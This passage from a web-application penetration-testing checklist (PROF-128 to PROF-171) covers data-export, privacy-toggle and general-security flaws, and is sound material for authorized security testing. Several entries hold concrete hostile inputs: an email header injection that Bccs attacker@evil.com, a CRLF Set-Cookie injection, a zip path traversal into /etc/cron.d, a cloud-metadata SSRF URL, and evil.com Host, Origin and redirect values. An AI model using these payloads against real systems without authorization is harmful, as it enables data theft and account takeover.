**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Manual Review / Burp Suite

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## PROF-128 — Race Condition on Export
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Download My Data (GDPR) - data-export endpoint / export id

**Test Steps:** 1. Request multiple exports simultaneously 2. Check for data inconsistency 3. Access exports of other users

**Expected Result:** Export should be atomic and user-specific

**Payload Example:**

```
Concurrent export requests
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## PROF-129 — Export Link Token Bypass
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Download My Data (GDPR) - data-export endpoint / export id

**Test Steps:** 1. Request export 2. Analyze download link token 3. Predict or brute force other tokens

**Expected Result:** Export tokens should be cryptographically random

**Payload Example:**

```
Sequential or predictable tokens
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite Sequencer / Custom Scripts

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## PROF-130 — Export Notification Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Download My Data (GDPR) - data-export endpoint / export id

**Test Steps:** 1. Set export notification email 2. Include injection payload 3. Check email headers

**Expected Result:** Application should validate email addresses

**Payload Example:**

```
email=victim@test.com%0aBcc:attacker@evil.com
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite / Email Analysis

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## PROF-131 — Zip Slip in Data Export
**Test Category:** Path Traversal · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Download My Data (GDPR) - data-export endpoint / export id

**Test Steps:** 1. Download data export 2. Check for path traversal in archive 3. Extract to arbitrary location

**Expected Result:** Archive should not contain path traversal

**Payload Example:**

```
../../../etc/cron.d/malicious in zip
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Zip Slip Scanner / Manual Analysis

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## PROF-132 — Data Export DoS
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Download My Data (GDPR) - data-export endpoint / export id

**Test Steps:** 1. Request multiple large exports 2. Monitor server resources 3. Attempt to exhaust storage

**Expected Result:** Application should rate limit export requests

**Payload Example:**

```
Request 100 exports simultaneously
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## PROF-133 — Incomplete Data Export
**Test Category:** Privacy Violation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Download My Data (GDPR) - data-export endpoint / export id

**Test Steps:** 1. Request data export 2. Compare with actual stored data 3. Identify missing data

**Expected Result:** Export should include all user data per GDPR

**Payload Example:**

```
Cross-reference with database
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Manual Review / Database Access

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## PROF-134 — Export Without Authentication Verification
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Download My Data (GDPR) - data-export endpoint / export id

**Test Steps:** 1. Request export 2. Wait for email link 3. Access link without authentication

**Expected Result:** Download should require re-authentication

**Payload Example:**

```
Access export link in incognito
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## PROF-135 — Toggle CSRF
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Public / Private Profile Toggle - visibility toggle / privacy flag

**Test Steps:** 1. Create malicious page to toggle profile visibility 2. Trick victim to visit 3. Check if visibility changed

**Expected Result:** Toggle should require CSRF token

**Payload Example:**

```
<form action="/toggle-visibility" method="POST">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## PROF-136 — IDOR on Visibility Toggle
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Public / Private Profile Toggle - visibility toggle / privacy flag

**Test Steps:** 1. Toggle own profile visibility 2. Modify user ID 3. Toggle another user's visibility

**Expected Result:** Application should verify ownership

**Payload Example:**

```
PUT /api/user/victim_id/visibility
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## PROF-137 — Privacy Bypass via Direct URL
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Public / Private Profile Toggle - visibility toggle / privacy flag

**Test Steps:** 1. Set profile to private 2. Access profile via direct URL 3. Check if content visible

**Expected Result:** Private profiles should not be accessible

**Payload Example:**

```
GET /profile/private_user direct access
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite / Browser

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## PROF-138 — Privacy Bypass via API
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Public / Private Profile Toggle - visibility toggle / privacy flag

**Test Steps:** 1. Set profile to private 2. Query profile via API 3. Check if data returned

**Expected Result:** API should enforce privacy settings

**Payload Example:**

```
GET /api/v1/users/private_user
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite / Postman

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## PROF-139 — Privacy Bypass via Search
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Public / Private Profile Toggle - visibility toggle / privacy flag

**Test Steps:** 1. Set profile to private 2. Search for user 3. Check if private user appears in results

**Expected Result:** Private users should not appear in search

**Payload Example:**

```
Search query for private user
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## PROF-140 — Privacy State Inconsistency
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Public / Private Profile Toggle - visibility toggle / privacy flag

**Test Steps:** 1. Toggle privacy rapidly 2. Check for race conditions 3. Access during state transition

**Expected Result:** Privacy state should be consistent

**Payload Example:**

```
Rapid toggle requests
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Turbo Intruder / Burp Suite

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## PROF-141 — Cached Public Data After Privacy Toggle
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Public / Private Profile Toggle - visibility toggle / privacy flag

**Test Steps:** 1. View public profile 2. User sets to private 3. Check if cached public version accessible

**Expected Result:** Cache should be invalidated on privacy change

**Payload Example:**

```
Access cached profile page
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite / CDN Testing

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## PROF-142 — Privacy Toggle Without Re-authentication
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Public / Private Profile Toggle - visibility toggle / privacy flag

**Test Steps:** 1. Toggle profile visibility 2. Check if password/2FA required 3. Test session fixation

**Expected Result:** Sensitive changes should require re-auth

**Payload Example:**

```
Toggle without password verification
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## PROF-143 — Mass Privacy Toggle
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Public / Private Profile Toggle - visibility toggle / privacy flag

**Test Steps:** 1. Find admin privacy toggle endpoint 2. Attempt to toggle multiple users 3. Check for authorization

**Expected Result:** Bulk operations should require admin auth

**Payload Example:**

```
PUT /api/admin/users/toggle-privacy
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite / Postman

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## PROF-144 — Privacy Settings Disclosure
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Public / Private Profile Toggle - visibility toggle / privacy flag

**Test Steps:** 1. Query user profiles 2. Check if privacy settings visible 3. Enumerate private accounts

**Expected Result:** Privacy settings should not be disclosed

**Payload Example:**

```
{"isPrivate": true} in response
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Burp Suite / Postman

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## PROF-145 — Sensitive Data in URL Parameters
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Security - account-security settings endpoints

**Test Steps:** 1. Analyze all profile URLs 2. Check for sensitive data in GET parameters 3. Review browser history exposure

**Expected Result:** Sensitive data should use POST or encrypted

**Payload Example:**

```
user_id/token/session in URL
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser History

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## PROF-146 — Insecure HTTP Methods
**Test Category:** Security Misconfiguration · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Security - account-security settings endpoints

**Test Steps:** 1. Test OPTIONS on profile endpoints 2. Try PUT/DELETE/TRACE 3. Check for unintended access

**Expected Result:** Only necessary HTTP methods should be allowed

**Payload Example:**

```
OPTIONS /api/profile
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite / curl

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## PROF-147 — Missing Security Headers
**Test Category:** Security Misconfiguration · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Security - account-security settings endpoints

**Test Steps:** 1. Request profile pages 2. Check response headers 3. Verify security headers present

**Expected Result:** All security headers should be implemented

**Payload Example:**

```
X-Frame-Options/CSP/HSTS missing
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Security Headers Scanner / Burp Suite

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## PROF-148 — CORS Misconfiguration
**Test Category:** Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Security - account-security settings endpoints

**Test Steps:** 1. Send request with Origin header 2. Check Access-Control-Allow-Origin 3. Test credential inclusion

**Expected Result:** CORS should not allow arbitrary origins

**Payload Example:**

```
Origin: https://evil.com
```

**Impact:** CORS misconfiguration -&gt; credentialed cross-origin secret theft -&gt; account takeover.

**Tools:** Burp Suite / curl

**References:** CWE-942; -&gt;[CORS checklist](#/checklist/cors); PortSwigger CORS; Christian Schneider

---

## PROF-149 — Content Security Policy Bypass
**Test Category:** Security Misconfiguration · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Security - account-security settings endpoints

**Test Steps:** 1. Analyze CSP header 2. Find allowed sources 3. Attempt XSS via allowed sources

**Expected Result:** CSP should be strict without unsafe-inline

**Payload Example:**

```
CSP with unsafe-inline or weak sources
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** CSP Evaluator / Burp Suite

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## PROF-150 — Session Fixation
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Security - account-security settings endpoints

**Test Steps:** 1. Obtain session before login 2. Trick user to use session 3. Access after user logs in

**Expected Result:** Session should regenerate after login

**Payload Example:**

```
Pre-auth session used post-auth
```

**Impact:** Session fixation/hijack -&gt; attacker rides the victim's authenticated session.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session management

---

## PROF-151 — Session Timeout Issues
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Security - account-security settings endpoints

**Test Steps:** 1. Login and note session 2. Wait for extended period 3. Check if session still valid

**Expected Result:** Sessions should timeout appropriately

**Payload Example:**

```
Session valid after 24+ hours idle
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Manual Testing

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## PROF-152 — Insecure Session Cookie Flags
**Test Category:** Security Misconfiguration · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Security - account-security settings endpoints

**Test Steps:** 1. Analyze session cookie 2. Check Secure/HttpOnly/SameSite flags 3. Attempt cookie theft

**Expected Result:** Cookies should have all security flags

**Payload Example:**

```
Missing Secure/HttpOnly/SameSite flags
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## PROF-153 — Verbose Error Messages
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Security - account-security settings endpoints

**Test Steps:** 1. Trigger errors in profile functions 2. Analyze error messages 3. Check for stack traces

**Expected Result:** Errors should not reveal internal details

**Payload Example:**

```
Stack trace/SQL error/file paths in error
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Fuzzing

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## PROF-154 — API Rate Limiting Bypass
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Security - account-security settings endpoints

**Test Steps:** 1. Send many requests rapidly 2. Try bypass techniques 3. Check for rate limit evasion

**Expected Result:** Rate limiting should be robust

**Payload Example:**

```
X-Forwarded-For/rotation bypass
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Rate Limit Testing

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## PROF-155 — Subdomain Takeover on Profile Assets
**Test Category:** Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Security - account-security settings endpoints

**Test Steps:** 1. Enumerate profile asset sources 2. Check for dangling DNS 3. Attempt subdomain takeover

**Expected Result:** All subdomains should be properly configured

**Payload Example:**

```
Unclaimed CDN/cloud storage
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Subjack / Can-I-Take-Over-XYZ

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## PROF-156 — Clickjacking on Profile Actions
**Test Category:** UI Redressing · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** General Security - account-security settings endpoints

**Test Steps:** 1. Check X-Frame-Options header 2. Create page that iframes profile 3. Test UI redressing

**Expected Result:** Profile should not be frameable

**Payload Example:**

```
Missing X-Frame-Options/CSP frame-ancestors
```

**Impact:** Clickjacking of a sensitive action -&gt; UI-redress-driven state change.

**Tools:** Burp Suite Clickbandit / Custom HTML

**References:** CWE-1021; -&gt;[CSRF checklist](#/checklist/csrf); OWASP Clickjacking; PortSwigger

---

## PROF-157 — HTTP Request Smuggling
**Test Category:** Request Smuggling · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Security - account-security settings endpoints

**Test Steps:** 1. Test for CL.TE and TE.CL vulnerabilities 2. Attempt to smuggle requests 3. Access other users' data

**Expected Result:** Server should handle Content-Length consistently

**Payload Example:**

```
CL.TE or TE.CL payload
```

**Impact:** HTTP request smuggling -&gt; cache poisoning / auth bypass / request hijacking.

**Tools:** Burp Suite HTTP Request Smuggler

**References:** CWE-444; -&gt;[Request Smuggling checklist](#/checklist/smuggling); James Kettle HTTP Desync Attacks

---

## PROF-158 — Web Cache Deception
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Security - account-security settings endpoints

**Test Steps:** 1. Append static extension to profile URL 2. View cached response 3. Access as another user

**Expected Result:** Dynamic pages should not be cached

**Payload Example:**

```
/profile/settings/anything.css
```

**Impact:** Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-524; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception

---

## PROF-159 — Host Header Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Security - account-security settings endpoints

**Test Steps:** 1. Modify Host header in profile requests 2. Check for redirection 3. Test password reset poisoning

**Expected Result:** Application should validate Host header

**Payload Example:**

```
Host: evil.com
```

**Impact:** Host-header injection into this flow -&gt; password-reset poisoning / cache poisoning -&gt; account takeover.

**Tools:** Burp Suite / curl

**References:** CWE-644; -&gt;[Host Header Injection checklist](#/checklist/hostheader); James Kettle Practical Web Cache Poisoning

---

## PROF-160 — HTTP Response Splitting
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Security - account-security settings endpoints

**Test Steps:** 1. Insert CRLF in profile parameters 2. Check for response header injection 3. Test for cache poisoning

**Expected Result:** Application should sanitize CRLF

**Payload Example:**

```
param=%0d%0aSet-Cookie:%20evil=value
```

**Impact:** CRLF/response-splitting -&gt; header injection, cache poisoning, session fixation.

**Tools:** Burp Suite / CRLFsuite

**References:** CWE-113; -&gt;[Host Header Injection checklist](#/checklist/hostheader); OWASP CRLF Injection; PortSwigger

---

## PROF-161 — Open Redirect in Profile URLs
**Test Category:** Open Redirect · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** General Security - account-security settings endpoints

**Test Steps:** 1. Find redirect parameters in profile 2. Test external URL redirect 3. Use for phishing

**Expected Result:** Redirects should only allow internal URLs

**Payload Example:**

```
redirect=https://evil.com
```

**Impact:** Open redirect -&gt; OAuth code/token theft, credible phishing on the trusted origin.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-601; -&gt;[Open Redirect checklist](#/checklist/openredir); PortSwigger; PayloadsAllTheThings

---

## PROF-162 — Broken Object Level Authorization
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Security - account-security settings endpoints

**Test Steps:** 1. Map all profile API endpoints 2. Test each with different user contexts 3. Check authorization

**Expected Result:** Every endpoint should verify authorization

**Payload Example:**

```
Comprehensive BOLA testing
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Autorize / AuthMatrix / Burp Suite

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## PROF-163 — Business Logic Flaws
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Security - account-security settings endpoints

**Test Steps:** 1. Analyze profile workflows 2. Skip or reorder steps 3. Test edge cases

**Expected Result:** Workflows should enforce proper sequence

**Payload Example:**

```
Skip verification steps
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Manual Testing / Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## PROF-164 — Denial of Service via Profile
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Security - account-security settings endpoints

**Test Steps:** 1. Find resource-intensive profile operations 2. Trigger repeatedly 3. Monitor server impact

**Expected Result:** Operations should have resource limits

**Payload Example:**

```
Regex DoS in profile search
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## PROF-165 — Second Order Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Security - account-security settings endpoints

**Test Steps:** 1. Store payload in profile 2. Trigger processing that uses stored data 3. Check for delayed injection

**Expected Result:** All data usage should be sanitized

**Payload Example:**

```
Payload stored then processed later
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Manual Testing

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## PROF-166 — Insecure Deserialization
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Security - account-security settings endpoints

**Test Steps:** 1. Find serialized data in profile requests 2. Modify serialized objects 3. Attempt code execution

**Expected Result:** Application should not deserialize untrusted data

**Payload Example:**

```
PHP/Java/Python serialized payloads
```

**Impact:** Insecure deserialization -&gt; remote code execution.

**Tools:** ysoserial / phpggc / Burp Suite

**References:** CWE-502; -&gt;[Insecure Deserialization checklist](#/checklist/deser); Bechler 'Java Unmarshaller Security'; ysoserial

---

## PROF-167 — Server-Side Request Forgery
**Test Category:** SSRF · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General Security - account-security settings endpoints

**Test Steps:** 1. Find profile features that fetch URLs 2. Test internal URL access 3. Attempt cloud metadata access

**Expected Result:** URL fetching should validate destinations

**Payload Example:**

```
http://169.254.169.254/latest/meta-data/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** SSRFmap / Burp Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## PROF-168 — Broken Function Level Authorization
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Security - account-security settings endpoints

**Test Steps:** 1. Identify admin profile functions 2. Access as regular user 3. Check for privilege escalation

**Expected Result:** Admin functions should check roles

**Payload Example:**

```
Access /admin/users as regular user
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Autorize / Burp Suite

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## PROF-169 — API Versioning Vulnerabilities
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Security - account-security settings endpoints

**Test Steps:** 1. Test different API versions 2. Check for deprecated vulnerable endpoints 3. Access restricted data

**Expected Result:** Old API versions should be secured or disabled

**Payload Example:**

```
/api/v1/ vs /api/v2/ security differences
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## PROF-170 — Insufficient Logging
**Test Category:** Security Misconfiguration · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General Security - account-security settings endpoints

**Test Steps:** 1. Perform malicious actions 2. Check if logged 3. Test log tampering

**Expected Result:** Security events should be logged

**Payload Example:**

```
Check for missing security logs
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Manual Review / Log Analysis

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## PROF-171 — Cryptographic Failures
**Test Category:** Cryptographic Failures · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General Security - account-security settings endpoints

**Test Steps:** 1. Analyze encryption in transit 2. Check certificate validity 3. Test for weak ciphers

**Expected Result:** Strong cryptography should be used

**Payload Example:**

```
SSL Labs scan/weak cipher detection
```

**Impact:** Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass.

**Tools:** SSLyze / testssl.sh / SSL Labs

